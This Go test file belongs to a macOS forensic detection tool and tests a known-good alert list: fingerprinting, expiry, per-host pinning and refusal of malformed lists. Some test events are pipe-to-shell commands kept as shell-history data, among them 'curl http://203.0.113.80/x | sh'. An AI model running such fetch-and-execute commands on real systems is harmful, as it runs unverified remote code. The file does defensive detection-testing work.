package knowngood

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/kenzietann/omamori/internal/event"
	"github.com/kenzietann/omamori/internal/rules"
)

var now = time.Date(2026, 11, 16, 9, 0, 0, 0, time.UTC)

func rule(t *testing.T, name string) *rules.Rule {
	t.Helper()
	parsed, err := rules.Parse([]byte("title: T\nname: "+name+"\nlogsource: {product: macos}\ndetection:\n  s: {action: x}\n  condition: s"), "t.yml")
	if err != nil {
		t.Fatal(err)
	}

	return parsed[0]
}

func launchdEvent(command, programs string) event.Event {
	return event.Event{Source: "forensics", Ref: "Library/LaunchAgents/ai.hermes.gateway.plist", Fields: map[string]string{
		"product": "macos", "service": "launchd_plist", "action": "launchd_item", "label": "ai.hermes.gateway",
		"command": command, "programs": programs, "collector": "forensics", "time_source": "file_modified",
	}}
}

func historyEvent(line int, command string) event.Event {
	return event.Event{Source: "forensics", Ref: "Users/aiko/.zsh_history:" + string(rune('0'+line)), Fields: map[string]string{
		"product": "macos", "service": "shell_history", "user": "aiko", "command": command,
	}}
}

func entryFor(t *testing.T, alert *rules.Alert, hashes map[string]string, host string, added, expires string) Entry {
	t.Helper()
	items, complete := Items(alert, hashes)
	if !complete {
		t.Fatal("the alert cannot be pinned")
	}

	return Entry{Rule: alert.Rule.Name, Note: "mine", Added: added, Expires: expires, Host: host, Items: items}
}

func TestFingerprintsArePreciseAndStable(t *testing.T) {
	hashes := map[string]string{"Library/LaunchAgents/ai.hermes.gateway.plist": strings.Repeat("a", 64)}
	base := Fingerprint("r", launchdEvent("/usr/bin/osascript -e x", "/Users/a/.hermes/bin/hermes=1"), hashes)

	again := launchdEvent("/usr/bin/osascript -e x", "/Users/a/.hermes/bin/hermes=1")
	again.Fields["pid"], again.Fields["collector"], again.Ref = "991", "other", "Library/LaunchAgents/ai.hermes.gateway.plist"
	if Fingerprint("r", again, hashes) != base {
		t.Error("a volatile field changed the fingerprint")
	}
	for name, changed := range map[string]Item{
		"another rule":             Fingerprint("r2", launchdEvent("/usr/bin/osascript -e x", "/Users/a/.hermes/bin/hermes=1"), hashes),
		"another command":          Fingerprint("r", launchdEvent("/usr/bin/osascript -e y", "/Users/a/.hermes/bin/hermes=1"), hashes),
		"another program":          Fingerprint("r", launchdEvent("/usr/bin/osascript -e x", "/Users/a/.hermes/bin/hermes=2"), hashes),
		"another hash of the file": Fingerprint("r", launchdEvent("/usr/bin/osascript -e x", "/Users/a/.hermes/bin/hermes=1"), map[string]string{"Library/LaunchAgents/ai.hermes.gateway.plist": strings.Repeat("b", 64)}),
	} {
		if changed.Fingerprint == base.Fingerprint {
			t.Errorf("%s gives the same fingerprint", name)
		}
		if name != "another rule" && changed.Subject != base.Subject {
			t.Errorf("%s changed the subject of the same file", name)
		}
	}
	// A line of a history is the thing itself: its subject is its fingerprint, and the file hash is not in it,
	// because every new command changes the file.
	line := Fingerprint("r", historyEvent(3, "curl x | sh"), map[string]string{"Users/aiko/.zsh_history": strings.Repeat("c", 64)})
	if line.Subject != line.Fingerprint || line != Fingerprint("r", historyEvent(7, "curl x | sh"), nil) {
		t.Errorf("a history line: %+v", line)
	}
	// Two fields that could be joined into the same text differently must not give the same fingerprint.
	first := event.Event{Fields: map[string]string{"a": "b\"=\"c"}}
	second := event.Event{Fields: map[string]string{"a": "b", "c": ""}}
	if Fingerprint("r", first, nil) == Fingerprint("r", second, nil) {
		t.Error("fields that look alike give one fingerprint")
	}
}

func TestApplyLowersOnlyWhatIsPinned(t *testing.T) {
	hermes := rule(t, "launchd")
	history := rule(t, "history")
	hashes := map[string]string{"Library/LaunchAgents/ai.hermes.gateway.plist": strings.Repeat("a", 64)}
	agent := &rules.Alert{Rule: hermes, Count: 1, Events: []event.Event{launchdEvent("/usr/bin/osascript -e x", "p=1")}}
	installer := &rules.Alert{Rule: history, Count: 1, Events: []event.Event{historyEvent(1, "curl https://claude.ai/install.sh | bash")}}
	list := &List{Version: Version, Entries: []Entry{
		entryFor(t, agent, hashes, "keng", "2026-11-01", "2027-01-30"),
		entryFor(t, installer, nil, "", "2026-08-01", "2026-11-10"),
	}}

	applied := Apply(list, "list.yml", []*rules.Alert{agent, installer}, hashes, "keng", now)
	if !applied.KnownGood(agent) || applied.Marks[installer].State != StateExpired || applied.Lowered != 1 {
		t.Fatalf("marks: %+v", applied.Marks)
	}

	// The same agent on another machine is not covered.
	if Apply(list, "", []*rules.Alert{agent}, hashes, "web01", now).KnownGood(agent) {
		t.Error("an entry of one machine covered another")
	}
	// The plist, or a program it starts, changed: the alert is back, marked as changed.
	for name, changed := range map[string]struct {
		alert  *rules.Alert
		hashes map[string]string
	}{
		"plist":   {agent, map[string]string{"Library/LaunchAgents/ai.hermes.gateway.plist": strings.Repeat("d", 64)}},
		"program": {&rules.Alert{Rule: hermes, Count: 1, Events: []event.Event{launchdEvent("/usr/bin/osascript -e x", "p=2")}}, hashes},
	} {
		mark := Apply(list, "", []*rules.Alert{changed.alert}, changed.hashes, "keng", now).Marks[changed.alert]
		if mark.State != StateChanged {
			t.Errorf("%s changed: %+v", name, mark)
		}
	}
	// A new curl | sh next to the allowed one is a new alert, with no mark.
	other := &rules.Alert{Rule: history, Count: 1, Events: []event.Event{historyEvent(2, "curl http://203.0.113.80/x | sh")}}
	if _, marked := Apply(list, "", []*rules.Alert{other}, nil, "keng", now).Marks[other]; marked {
		t.Error("a new command was marked")
	}
	// An alert that keeps fewer events than it counts cannot be covered, even if those it keeps are pinned.
	counted := &rules.Alert{Rule: hermes, Count: 40, Events: agent.Events}
	if Apply(list, "", []*rules.Alert{counted}, hashes, "keng", now).KnownGood(counted) {
		t.Error("an alert of many events was covered by a few")
	}
	// Every event must be covered, not only one of them.
	two := &rules.Alert{Rule: hermes, Count: 2, Events: []event.Event{agent.Events[0], launchdEvent("/tmp/x", "")}}
	if Apply(list, "", []*rules.Alert{two}, hashes, "keng", now).KnownGood(two) {
		t.Error("an alert was covered by half of its events")
	}
	// No list lowers nothing.
	var none *Applied
	if none.KnownGood(agent) {
		t.Error("a nil list lowered an alert")
	}
}

func TestListsThatAreRefused(t *testing.T) {
	item := "    - subject: " + strings.Repeat("a", 64) + "\n      fingerprint: " + strings.Repeat("b", 64) + "\n"
	good := "version: 1\nentries:\n  - rule: launchd\n    note: mine\n    added: 2026-11-16\n    expires: 2027-02-14\n    items:\n" + item
	list, err := Parse([]byte(good))
	if err != nil || len(list.Entries) != 1 || len(list.SHA256) != 64 {
		t.Fatalf("a good list: %v %v", list, err)
	}
	text, err := list.Text()
	if err != nil {
		t.Fatal(err)
	}
	if again, err := Parse([]byte(text)); err != nil || len(again.Entries) != 1 {
		t.Fatalf("the written list cannot be read again: %v", err)
	}
	for name, text := range map[string]string{
		"another version":  strings.Replace(good, "version: 1", "version: 2", 1),
		"an unknown field": strings.Replace(good, "    note: mine\n", "    note: mine\n    allow_all: true\n", 1),
		"no note":          strings.Replace(good, "    note: mine\n", "    note: \"  \"\n", 1),
		"no items":         strings.Replace(good, "    items:\n"+item, "    items: []\n", 1),
		"a short hash":     strings.Replace(good, strings.Repeat("b", 64), "bbbb", 1),
		"a capital hash":   strings.Replace(good, strings.Repeat("b", 64), strings.Repeat("B", 64), 1),
		"too long":         strings.Replace(good, "2027-02-14", "2028-02-14", 1),
		"expires first":    strings.Replace(good, "2027-02-14", "2026-11-01", 1),
		"no date":          strings.Replace(good, "2026-11-16", "today", 1),
		"no rule":          strings.Replace(good, "rule: launchd", "rule: \"a b\"", 1),
		"not yaml":         "version: [",
	} {
		if _, err := Parse([]byte(text)); err == nil {
			t.Errorf("%s was taken", name)
		}
	}
	if _, err := Load(filepath.Join(t.TempDir(), "missing.yml")); err == nil {
		t.Error("a missing list was taken")
	}
	if _, _, err := Dates(now, MaxDays+1); err == nil {
		t.Error("an entry of more than a year was taken")
	}
	if added, expires, err := Dates(now, 90); err != nil || added != "2026-11-16" || expires != "2027-02-14" {
		t.Errorf("dates: %s %s %v", added, expires, err)
	}
}

func TestTheListMustBeOutsideTheEvidence(t *testing.T) {
	evidence := t.TempDir()
	os.MkdirAll(filepath.Join(evidence, "etc"), 0o700)
	inside := filepath.Join(evidence, "etc", "known-good.yml")
	outside := filepath.Join(t.TempDir(), "known-good.yml")
	if err := Outside(inside, []string{evidence}); err == nil {
		t.Error("a list inside the evidence was taken")
	}
	if err := Outside(outside, []string{evidence}); err != nil {
		t.Errorf("a list outside: %v", err)
	}
	// A link from outside into the evidence is the evidence.
	os.WriteFile(inside, []byte("x"), 0o600)
	link := filepath.Join(t.TempDir(), "link.yml")
	if err := os.Symlink(inside, link); err != nil {
		t.Fatal(err)
	}
	if err := Outside(link, []string{evidence}); err == nil {
		t.Error("a link into the evidence was taken")
	}
	// A folder next to the evidence whose name starts the same is not inside it.
	if err := Outside(evidence+"-lists/known-good.yml", []string{evidence}); err != nil {
		t.Errorf("a folder next to the evidence: %v", err)
	}
}
